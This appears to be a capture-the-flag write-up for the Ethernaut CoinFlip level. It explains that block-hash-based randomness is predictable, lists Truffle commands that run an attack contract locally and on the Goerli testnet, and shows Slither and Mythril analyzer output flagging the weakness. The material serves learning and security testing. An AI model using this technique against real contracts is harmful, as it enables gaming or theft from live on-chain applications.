# CoinFlip

[CoinFlip](https://ethernaut.openzeppelin.com/level/0x9240670dbd6476e6a32055E52A0b0756abd26fd2)

This bug boils down to "randomness" that is generated deterministically.
Hence it is vulnerable to front-running.

<BR />


## Testing Attack

```BASH
truffle develop
```

```JS
migrate
attack = await CoinFlipAttack.deployed()

await attack.target()
await attack.flip({from: accounts[1]})
(await attack.fail()).toString()
(await attack.success()).toString()
```

<BR />

## Live Attack

```BASH
truffle console --network goerli
```


```JS
// Identify the account index
// 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
accounts
sender = accounts[5]

migrate

attack = await CoinFlipAttack.deployed()

await attack.target()
await attack.flip({from: sender})
(await attack.fail()).toString()
(await attack.success()).toString()

flip = await CoinFlip.at('0xA737b256ed909Fd726Ef5E59793fd9A60D516D23')
(await flip.consecutiveWins()).toString()
```

<BR />

## Vulnerability Testing Tools

<BR />

### Slither

Not detected.

```BASH
slither ./contracts/CoinFlip.sol  --truffle-ignore-compile --exclude-optimization 
```

```
CoinFlip.flip(bool) (contracts/CoinFlip.sol#14-32) uses a dangerous strict equality:
        - lastHash == blockValue (contracts/CoinFlip.sol#17)
CoinFlip.flip(bool) (contracts/CoinFlip.sol#14-32) uses a dangerous strict equality:
        - coinFlip == 1 (contracts/CoinFlip.sol#23)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#dangerous-strict-equalities

Pragma version^0.8.0 (contracts/CoinFlip.sol#2) allows old versions
solc-0.8.9 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Parameter CoinFlip.flip(bool)._guess (contracts/CoinFlip.sol#14) is not in mixedCase
Variable CoinFlip.FACTOR (contracts/CoinFlip.sol#8) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
./contracts/CoinFlip.sol analyzed (1 contracts with 76 detectors), 6 result(s) found
```


<BR />

### Mythril

__Bug Detected__

```BASH
docker run --rm `
        -v /c/temp/QuickTest/blockchain-ctf/ethernaut/01_coinflip:/share `
        mythril/myth `
        analyze /share/contracts/CoinFlip.sol `
        --solv 0.8.0
```

```
==== Dependence on predictable environment variable ====
SWC ID: 120
Severity: Low
Contract: CoinFlip
Function name: flip(bool)
PC address: 169
Estimated Gas Usage: 1421 - 1516
A control flow decision is made based on The block hash of a previous block.
The block hash of a previous block is used to determine a control flow decision. Note that the values of variables like coinbase, gaslimit, block number and timestamp are predictable and can be manipulated by a malicious miner. Also keep in mind that attackers know hashes of earlier blocks. Don't use any of those environment 
variables as sources of randomness and be aware that use of these variables introduces a certain level of trust into miners.
--------------------
In file: /share/contracts/CoinFlip.sol:17

if (lastHash == blockValue) {
      revert();
    }

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: flip(bool), txdata: 0x1d263f670000000000000000000000000000000000000000000000000000000000000001, decoded_data: (True,), value: 0x0

==== Dependence on predictable environment variable ====
SWC ID: 120
Severity: Low
Contract: CoinFlip
Function name: flip(bool)
PC address: 209
Estimated Gas Usage: 7453 - 27548
A control flow decision is made based on The block hash of a previous block.
The block hash of a previous block is used to determine a control flow decision. Note that the values of variables like coinbase, gaslimit, block number and timestamp are predictable and can be manipulated by a malicious miner. Also keep in mind that attackers know hashes of earlier blocks. Don't use any of those environment 
variables as sources of randomness and be aware that use of these variables introduces a certain level of trust into miners.
--------------------
In file: /share/contracts/CoinFlip.sol:23

coinFlip == 1 ? true : false

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [SOMEGUY], function: flip(bool), txdata: 0x1d263f670000000000000000000000000000000000000000000000000000000000000001, decoded_data: (True,), value: 0x0

==== Dependence on predictable environment variable ====
SWC ID: 120
Severity: Low
Contract: CoinFlip
Function name: flip(bool)
PC address: 521
Estimated Gas Usage: 531 - 626
A control flow decision is made based on The block.number environment variable.
The block.number environment variable is used to determine a control flow decision. Note that the values of variables like coinbase, gaslimit, block number and timestamp are predictable and can be manipulated by a malicious miner. Also keep in mind that attackers know hashes of earlier blocks. Don't use any of those environment variables as sources of randomness and be aware that use of these variables introduces a certain level of 
trust into miners.
--------------------
In file: #utility.yul:54

if

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: flip(bool), txdata: 0x1d263f670000000000000000000000000000000000000000000000000000000000000001, decoded_data: (True,), value: 0x0
```

